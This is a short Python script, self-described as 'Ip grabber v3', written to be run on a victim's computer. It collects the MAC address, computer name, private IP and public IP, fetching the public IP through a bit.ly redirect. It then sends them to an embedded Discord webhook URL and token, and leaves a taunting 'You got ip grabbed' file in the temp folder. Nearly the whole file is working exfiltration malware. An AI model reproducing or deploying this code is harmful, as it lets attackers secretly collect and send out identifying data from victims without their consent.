import requests 
import socket
import platform
import tempfile
import os
from base64 import b64decode
from discord_webhook import DiscordWebhook
from urllib.request import Request, urlopen
from uuid import getnode as get_mac
########################################################
# Starting script
#
#Webhook, used to deliver the ip.
hook = 'https://discordapp.com/api/webhooks/742819597350207549/qnfuVIZcz2z15Uka0WzRbId5ohUlgzbduzZh7UJTHOPc4d95xEV8VMK78jSCiqv1Pv0M'
#
#
#
#Mac adress grabber
mac = get_mac()
#
#Pc name grabber
pcname = os.getenv('COMPUTERNAME')
#
#private ip grabber.
PIP = socket.gethostname()
Privateip = socket.gethostbyname(PIP)
#
#public ip grabber
ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
#bitly      -->      https://api.ipify.org/
#
# Sends the ip to an webhook
webhook = DiscordWebhook(url=f'{hook}', username='Ip grabber', content=f'Ip grabber v3\n\nOperating system: {platform.system()}\nVersion: {platform.release()}\nPc Name: {pcname}\nMac Adress: {mac}\nPublic Ip Adress: {ip} \nPrivate Ip Adress: {Privateip}\n\nMade by <@738138455476797581>')
response = webhook.execute()
#
fd, cu3tgrabber = tempfile.mkstemp()
f1  = open(cu3tgrabber, 'w')
f1.write('You got ip grabbed. \n\nCreated by Cuet#1337')
f1.close()
# Ending.
# Created by Cuet#1337